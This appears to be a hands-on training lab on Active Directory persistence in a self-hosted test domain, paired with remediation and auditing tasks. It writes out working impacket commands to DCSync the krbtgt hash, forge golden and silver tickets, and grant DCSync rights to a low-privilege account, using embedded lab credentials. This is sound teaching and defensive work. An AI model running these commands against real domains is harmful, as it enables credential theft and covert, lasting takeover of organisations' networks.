# Lab 07 — Persistence in Active Directory

*Hands-on lab · [← Back to the module concept](README.md)*


## Setup

```bash
git clone https://github.com/plaintext-security/plaintext-labs
cd plaintext-labs/active-directory/07-persistence-ad
make up      # start Samba4 DC + attacker
make demo    # demonstrate golden ticket creation + DCSync persistence
make shell   # interactive shell
make down
```

> Only attack environments you own or have explicit written permission to test.

## Scenario

You have achieved domain admin access on Meridian (modules 04-06). Before the blue team discovers the breach, you want to establish persistence mechanisms that survive password resets and account remediation. Your goal: forge a golden ticket, forge a silver ticket for the MSSQL service, demonstrate DCSync persistence rights, and document what incident response must do to genuinely remove each persistence method.

## Do

1. [ ] **Extract the krbtgt hash.** Using the domain admin credential (`tallen:T@ll3n_IT@dmin!`), DCSync the `krbtgt` account:
   ```
   secretsdump.py MERIDIAN.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.meridian.local \
     -just-dc-user krbtgt
   ```
   Note the NT hash for `krbtgt`. Also extract the domain SID (it appears in the secretsdump output, or run `rpcclient -U 'tallen%T@ll3n_IT@dmin!' dc01.meridian.local -c lsaquery`).

2. [ ] **Forge a golden ticket.** Use impacket's ticketer to create a golden ticket for a user that doesn't even need to exist:
   ```
   ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain MERIDIAN.LOCAL \
     -groups 512 phantom_admin
   ```
   The `-groups 512` adds the user to Domain Admins (group RID 512). The resulting `phantom_admin.ccache` file contains the forged TGT.

3. [ ] **Use the golden ticket.** Export the ticket and use it to authenticate:
   ```
   export KRB5CCNAME=phantom_admin.ccache
   klist              # verify the ticket contents
   secretsdump.py -k -no-pass dc01.meridian.local
   ```
   You now have DA-level access as a user who doesn't exist in the directory. Note: does the domain need to be reachable for ticket issuance? (No — the ticket was forged locally.)

4. [ ] **Forge a silver ticket.** Extract `svc-mssql`'s hash from secretsdump, then forge a silver ticket for the MSSQL service:
   ```
   ticketer.py -nthash SVC_MSSQL_HASH -domain-sid DOMAIN_SID -domain MERIDIAN.LOCAL \
     -spn MSSQLSvc/db01.meridian.local:1433 -user-id 500 Administrator
   ```
   Note: this ticket never touches the KDC — no Event 4769 will appear.

5. [ ] **Add DCSync rights.** Demonstrate how an attacker adds replication rights to a low-privilege account (`jsmith`) as a persistence mechanism. In the lab environment (requires DA credential):
   ```
   dacledit.py MERIDIAN.LOCAL/tallen:'T@ll3n_IT@dmin!'@dc01.meridian.local \
     -action write -rights DCSync -principal jsmith -target-dn 'DC=meridian,DC=local'
   ```
   Then verify `jsmith` can now DCSync:
   ```
   secretsdump.py MERIDIAN.LOCAL/jsmith:'Welcome1!'@dc01.meridian.local -just-dc-ntlm
   ```

6. [ ] **Write the remediation checklist.** For each persistence method, write down: what specific action removes it? What can the attacker do before the remediation takes effect? (Key: golden tickets remain valid until expiry even after `krbtgt` is rotated once — that's why two rotations are required.)

## Success criteria — you're done when

- [ ] You have forged a golden ticket for a non-existent user and used it for DC access.
- [ ] You have forged a silver ticket for the MSSQL SPN without KDC contact.
- [ ] You have added (and verified) DCSync rights to a low-privilege account.
- [ ] You have written the specific remediation steps for each persistence method, including the "rotate krbtgt twice" requirement.

## Deliverables

`persistence-report.md` — the persistence methods demonstrated, the artefacts generated (ticket filenames, not the actual hashes), the ATT&CK technique IDs (T1558.001, T1558.002, T1003.006), and a remediation checklist for each. Commit it.

## Automate & own it

**Required.** Write `persistence-audit.py` — a script that queries the domain object's ACL (using `ldap3`) and reports any non-default principals with `DS-Replication-Get-Changes-All` rights, and queries AdminSDHolder's ACL for non-default ACEs. Have a model draft the ACL parsing; you verify the GUID for `DS-Replication-Get-Changes-All` (`1131f6ad-...`) against the Microsoft documentation. This is the automated persistence check that incident responders should run after every engagement. Commit it.

## AI acceleration

Ask a model to write a complete golden ticket attack narrative for a client report — one that explains to a non-technical executive why "we reset the attacker's password" is not sufficient remediation. The model's output will likely be good; your job is to verify the technical claims (double krbtgt rotation, AdminSDHolder propagation timer, outstanding ticket validity) against primary sources before putting it in a deliverable.

## Connects forward

The golden ticket detection (Event 4769 with anomalous PAC, Event 4768 anomalies) is the basis for Sigma rules in module 09. The DCSync rights audit script you write here is part of the hardening-as-code in module 10. The full remediation checklist is the foundation for the defender's response playbook in module 11.

## Marketable proof

> "I demonstrate and explain active directory persistence mechanisms — golden tickets, silver tickets, DCSync rights — including what incident response must do to genuinely remove each one, not just lock out the attacker's user account."

## Stretch

- Research **AdminSDHolder abuse**: an attacker with DA can add themselves to the AdminSDHolder object's ACL, which propagates to all protected groups every 60 minutes. How would you detect this? What does the ACL diff look like before and after?
- Look into **skeleton key** attacks: a persistence mechanism where a malware patches LSASS on the DC so any account accepts a specific "master" password. Why does this not survive a DC reboot?
